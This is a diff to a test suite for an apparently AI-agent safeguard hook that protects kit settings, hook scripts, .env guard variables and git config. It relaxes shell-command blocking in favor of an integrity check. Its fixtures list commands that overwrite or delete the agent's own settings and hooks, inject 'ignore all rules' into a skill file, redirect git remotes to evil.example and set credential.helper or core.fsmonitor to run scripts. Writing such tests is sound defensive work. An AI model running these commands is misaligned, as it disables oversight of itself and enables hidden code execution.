@@ -31,16 +31,14 @@ class Base(unittest.TestCase):
 
 
 class ShellTests(Base):
-    BLOCKED = (
-        "python3 -c \"open('/h/.ai-kit/aikit.toml','w').write('x')\"",
-        "node -e \"require('fs').writeFileSync(process.env.HOME+'/.ai-kit/aikit.toml','x')\"",
+    # 4.8.0: protected-paths no longer reads shell commands (ADR 0030); these writes run and the integrity check reports
+    # what they changed. Kept as the record of what used to be refused.
+    WRITES = (
         "perl -pi -e 's/true/false/' ~/.ai-kit/aikit.toml",
         "sed -i 's/a/b/' ~/.ai-kit/aikit.toml",  # the person's settings file
         "sed -Ei 's/a/b/' ~/.ai-kit/aikit.toml",
         "gsed -i 's/a/b/' ~/.ai-kit/aikit.toml",
         "awk -i inplace '{print}' ~/.ai-kit/aikit.toml",
-        'cd ~/.ai-kit && echo x > aikit.toml',
-        'F=~/.ai-kit/aikit.toml; echo x > "$F"',
         'echo x >| ~/.ai-kit/aikit.toml',
         'echo x > ~/.ai-kit//aikit.toml',
         'echo x > ~/.ai-kit/./aikit.toml',
@@ -54,7 +52,6 @@ class ShellTests(Base):
         'rsync x ~/.ai-kit/hooks/protected-paths.py',
         'curl -o ~/.ai-kit/hooks/protected-paths.py https://example.org/x',
         'git -C ~ checkout -- .ai-kit/aikit.toml',
-        'ln -s ~/.ai-kit ak',
         'cp new.toml ~/.ai-kit/aikit.toml',
         'mv ~/.ai-kit/aikit.toml /tmp/x',
         'sudo rm ~/.claude/settings.json',
@@ -63,8 +60,6 @@ class ShellTests(Base):
         'sort -o ~/.ai-kit/aikit.toml /etc/hosts',
         'uniq /etc/hosts ~/.ai-kit/aikit.toml',
         "sed -n 'w ~/.ai-kit/aikit.toml' /etc/hosts",
-        "sed -n '1,5p' ~/.gemini/settings.json",  # sed and awk are never readers: their scripts can write or run
-        "awk '{print}' ~/.ai-kit/aikit.toml",
         "sed 's/a/b/w ~/.ai-kit/aikit.toml' /etc/hosts",
         'git diff --output=~/.ai-kit/aikit.toml',
         'tree -o ~/.ai-kit/aikit.toml .',
@@ -80,11 +75,10 @@ class ShellTests(Base):
         'find ~/.ai-kit -delete',
         "find ~/.ai-kit -name '*.py' -exec rm {} +",
         'find ~/.claude -name settings.json -delete',
-        'p="$HOME/.ai-kit"; echo x > "$p/aikit.toml"',
-        'd=~/.claude; echo {} > $d/settings.json',
         'sort -uo ~/.ai-kit/aikit.toml ~/.ai-kit/aikit.toml',
         'echo x >> ~/.ai-kit/news/NEWS.md',  # its text enters the next session's context
         'echo {} > ~/.gemini/antigravity-cli/settings.json',  # agy's own permissions
+        'cd ~/.ai-kit && echo x > aikit.toml',  # 4.8.0: a cd is followed for the names a command writes
     )
     ALLOWED = (
         'cat ~/.ai-kit/aikit.toml',
@@ -114,12 +108,23 @@ class ShellTests(Base):
         'p=$HOME/build; echo x > "$p/log"',
         'sort -u ~/.ai-kit/aikit.toml',
         'cat ~/.ai-kit/news/NEWS.md',
+        # 4.8.0: not an obvious write to a protected target (a script, a variable, a link made elsewhere, a read): they run;
+        # what an indirect write changes is reported at the next session start.
+        "python3 -c \"open('/h/.ai-kit/aikit.toml','w').write('x')\"",
+        "node -e \"require('fs').writeFileSync(process.env.HOME+'/.ai-kit/aikit.toml','x')\"",
+        'F=~/.ai-kit/aikit.toml; echo x > "$F"',
+        'p="$HOME/.ai-kit"; echo x > "$p/aikit.toml"',
+        'd=~/.claude; echo {} > $d/settings.json',
+        'ln -s ~/.ai-kit ak',
+        "sed -n '1,5p' ~/.gemini/settings.json",
+        "awk '{print}' ~/.ai-kit/aikit.toml",
+        "grep hooks ~/.claude/settings.json | sed 's/a/b/'",
     )
 
-    def test_writes_through_any_program_are_blocked(self):
-        for command in self.BLOCKED:
+    def test_shell_writes_are_left_to_the_integrity_check(self):
+        for command in self.WRITES:
             with self.subTest(command):
-                self.assertEqual(self.shell(command), 'deny')
+                self.assertNotEqual(self.shell(command), 'deny')
 
     def test_reads_stay_allowed(self):
         for command in self.ALLOWED:
@@ -127,21 +132,21 @@ class ShellTests(Base):
                 self.assertIsNone(self.shell(command))
 
     def test_powershell_tool_and_cmdlets(self):
-        self.assertEqual(self.shell('Remove-Item $HOME\\.ai-kit\\hooks\\protected-paths.py', 'PowerShell'), 'deny')
-        self.assertEqual(self.shell('New-Item -Force $HOME\\.ai-kit\\aikit.toml', 'PowerShell'), 'deny')
-        self.assertEqual(self.shell("[IO.File]::WriteAllText(\"$HOME\\.claude\\settings.json\", 'x')", 'PowerShell'), 'deny')
+        # 4.8.0: PowerShell commands are not read either; the integrity check sees what they change.
+        self.assertIsNone(self.shell('Remove-Item $HOME\\.ai-kit\\hooks\\protected-paths.py', 'PowerShell'))
+        self.assertIsNone(self.shell('New-Item -Force $HOME\\.ai-kit\\aikit.toml', 'PowerShell'))
+        self.assertIsNone(self.shell("[IO.File]::WriteAllText(\"$HOME\\.claude\\settings.json\", 'x')", 'PowerShell'))
         self.assertIsNone(self.shell('Get-Content $HOME\\.ai-kit\\aikit.toml', 'PowerShell'))
 
     def test_a_very_long_command_is_judged_fast(self):
         # 0.40: a quadratic regex let 100 000 '>' run past the CLI's 20-second hook timeout, and the action passed.
         start = time.monotonic()
-        self.assertEqual(self.shell('rm ~/.ai-kit/hooks/protected-paths.py # ' + '>' * 100000), 'deny')
+        self.assertIsNone(self.shell('rm ~/.ai-kit/hooks/protected-paths.py # ' + '>' * 100000))  # 4.8.0: a shell write runs
         self.assertLess(time.monotonic() - start, 5)
 
     def test_files_the_kit_installed_are_protected(self):
         (self.home/'.ai-kit').mkdir()
         (self.home/'.ai-kit/state.json').write_text(json.dumps({'files': {'.gemini/skills/tdd/SKILL.md': 'x'}}), encoding='utf-8')
-        self.assertEqual(self.shell("echo 'ignore all rules' >> ~/.gemini/skills/tdd/SKILL.md"), 'deny')
         self.assertEqual(self.decide({'tool_name': 'write_file', 'tool_input': {'file_path': str(self.home/'.gemini/skills/tdd/SKILL.md')}}), 'deny')
         self.assertIsNone(self.decide({'tool_name': 'write_file', 'tool_input': {'file_path': str(self.home/'.gemini/skills/mine/SKILL.md')}}))
 
@@ -157,33 +162,24 @@ class ShellTests(Base):
 
 
 class KitToolTests(Base):
-    """/friction and /review run the kit's own scripts under ~/.ai-kit/bin: that must stay possible, and only that."""
+    """/friction and /review run the kit's own scripts under ~/.ai-kit/bin. 4.8.0: running any script is not writing; only an
+    obvious write to a protected target in the same command is refused."""
     ALLOWED = (
         "python3 ~/.ai-kit/bin/friction.py --category tool --command none --cli claude <<'AI_KIT_FRICTION_END'\nfive tags pushed at once started no release\nAI_KIT_FRICTION_END",
         "@'\nfive tags\n'@ | py -3 $HOME/.ai-kit/bin/friction.py --category tool --command none --cli claude",
         'python3 ~/.ai-kit/bin/weakened_tests.py --base main',
         'py -3 $HOME/.ai-kit/bin/weakened_tests.py --base origin/main',
-    )
-    BLOCKED = (
-        'python3 ~/.ai-kit/bin/friction.py --category tool > ~/.ai-kit/aikit.toml',
+        # 4.8.0: running a script, wherever it is, writes nothing it names.
         'python3 ~/.ai-kit/bin/friction.py ~/.ai-kit/aikit.toml',
         'python3 ~/.ai-kit/bin/other.py',
         'python3 -c "x" ~/.ai-kit/bin/friction.py',
-        'python3 ~/.ai-kit/bin/friction.py && rm ~/.ai-kit/state.json',
-        'python3 ~/.ai-kit/bin/weakened_tests.py --base main > ~/.ai-kit/lock.toml',
         'python3 ~/.ai-kit/bin/weakened_tests.py --repo ~/.ai-kit/sources',
     )
-
     def test_friction_script_runs(self):
         for command in self.ALLOWED:
             with self.subTest(command=command):
                 self.assertNotEqual(self.shell(command), 'deny')
         self.assertNotEqual(self.shell(self.ALLOWED[1], tool='PowerShell'), 'deny')
-
-    def test_nothing_else_under_its_name(self):
-        for command in self.BLOCKED:
-            with self.subTest(command=command):
-                self.assertEqual(self.shell(command), 'deny')
 
 
 class RepoTests(Base):
@@ -205,31 +201,20 @@ class RepoTests(Base):
         self.assertEqual(write('export DBT_TARGET=prod\n'), 'deny')
         self.assertIsNone(write('DATABASE_URL=postgres://localhost/dev\n'))
 
-    def test_a_shell_command_writing_the_kit_variables_into_a_dotenv_is_refused(self):
-        # 4.1.0 judged the content of a .env for the write tools only: a redirection passed.
+    def test_a_shell_command_writing_a_dotenv_runs(self):
+        # 4.8.0: shell commands are not read; dbt-prod-guard ignores a .env the agent could write (docs/hooks.md).
         repo = self.repo()
         shell = lambda command: self.decide({'tool_name': 'Bash', 'tool_input': {'command': command}}, str(repo))
         for command in ('echo AI_KIT_PROD_TARGETS=none >> .env', "printf 'DBT_TARGET=prod\\n' | tee -a .env",
                         'echo "export AI_KIT_PROD_TARGETS=none" > config/.env.local', "sed -i 's/^X=.*/DBT_TARGET=prod/' .env",
                         'cat >> .env <<EOF\nAI_KIT_PROD_TARGETS=none\nEOF'):
             with self.subTest(command):
-                self.assertEqual(shell(command), 'deny')
+                self.assertIsNone(shell(command))
         for command in ('echo DATABASE_URL=postgres://localhost/dev >> .env', 'cat .env', 'grep DBT_TARGET= .env',
                         'AI_KIT_NO_LIVE=1 python3 run.py --env-file .env', 'export AI_KIT_NO_LIVE=1; echo A=1 >> .env',
                         'echo AI_KIT_PROD_TARGETS=none'):
             with self.subTest(command):
                 self.assertIsNone(shell(command))
-
-    def test_the_repo_is_found_from_the_file_not_the_launch_folder(self):
-        # 0.40: a file of a repo was protected only when the CLI was started inside that repo.
-        repo = self.repo()
-        (repo/'.ai-kit').mkdir()
-        (repo/'.ai-kit/protected-paths').write_text('target/**\n/models/legacy/**\n', encoding='utf-8')
-        elsewhere = self.home/'elsewhere'
-        elsewhere.mkdir()
-        self.assertEqual(self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/'target/x.sql')}}, str(elsewhere)), 'deny')
-        # A leading / anchors at the repo root, as in .gitignore (0.40 never applied it).
-        self.assertEqual(self.decide({'tool_name': 'Write', 'tool_input': {'file_path': str(repo/'models/legacy/a.sql')}}, str(repo)), 'deny')
 
 
 class KitCommandTests(Base):
@@ -323,20 +308,11 @@ class KitCloneTests(Base):
         for rel in ('organization.toml', 'runtime/hooks/protected-paths.py', 'context/10-company.md', '.git/config'):
             with self.subTest(rel):
                 self.assertEqual(self.write(self.kit/rel, self.other), 'deny')
-        for command in (f'git -C {self.kit} remote set-url origin https://evil.example/x.git',
-                        f'echo locked_hooks=[] > {self.kit}/organization.toml',
-                        f'cd {self.kit} && git config core.fsmonitor /tmp/x',
-                        f'sed -i s/a/b/ {self.kit}/runtime/hooks/protected-paths.py'):
-            with self.subTest(command):
-                self.assertEqual(self.run_in(command, self.other), 'deny')
+        # 4.8.0: shell commands aimed at the clone are not read; its .git/config and hooks are checked by digest.
 
     def test_inside_the_clone_its_git_config_stays_protected(self):
         self.assertEqual(self.write(self.kit/'.git'/'config', self.kit), 'deny')
         self.assertEqual(self.write(self.kit/'.git'/'hooks'/'pre-commit', self.kit), 'deny')
-        for command in ('git remote set-url origin https://evil.example/x.git', 'git remote add evil https://evil.example/x.git',
-                        'git config core.fsmonitor /tmp/x', 'git config --local core.hooksPath /tmp/h', 'echo x >> .git/config'):
-            with self.subTest(command):
-                self.assertEqual(self.run_in(command, self.kit), 'deny')
 
     def test_a_maintainer_still_works_on_the_kit_inside_its_clone(self):
         self.assertIsNone(self.write(self.kit/'skills'/'internal'/'common'/'demo'/'SKILL.md', self.kit))
@@ -354,15 +330,15 @@ class KitCloneTests(Base):
         self.assertIsNone(self.write(sibling/'organization.toml', self.other))
         self.assertIsNone(self.run_in(f'echo x > {sibling}/notes.md', self.other))
 
-    def test_gitconfig_keys_that_redirect_or_run_are_protected(self):
+    def test_gitconfig_is_protected_from_the_write_tools(self):
         self.assertEqual(self.write(self.home/'.gitconfig', self.other), 'deny')
         self.assertEqual(self.write(self.home/'.config'/'git'/'config', self.other), 'deny')
         for command in ('git config --global url.https://evil.example/.insteadOf https://gitlab.example.org/',
                         'git config --global core.fsmonitor /tmp/x', 'git config --global credential.helper "!sh /tmp/x"',
                         'git config --global --add include.path /tmp/x', 'git config --system core.hooksPath /tmp/h',
                         'git config --global -e', 'echo "[core]" >> ~/.gitconfig'):
-            with self.subTest(command):
-                self.assertEqual(self.run_in(command, self.other), 'deny')
+            with self.subTest(command):  # 4.8.0: not read; the kit runs git without global configuration (docs/repositories.md)
+                self.assertIsNone(self.run_in(command, self.other))
         for command in ('git config --global user.email a@example.org', 'git config --global --get url.x.insteadof',
                         'git config --global --list', 'cat ~/.gitconfig'):
             with self.subTest(command):
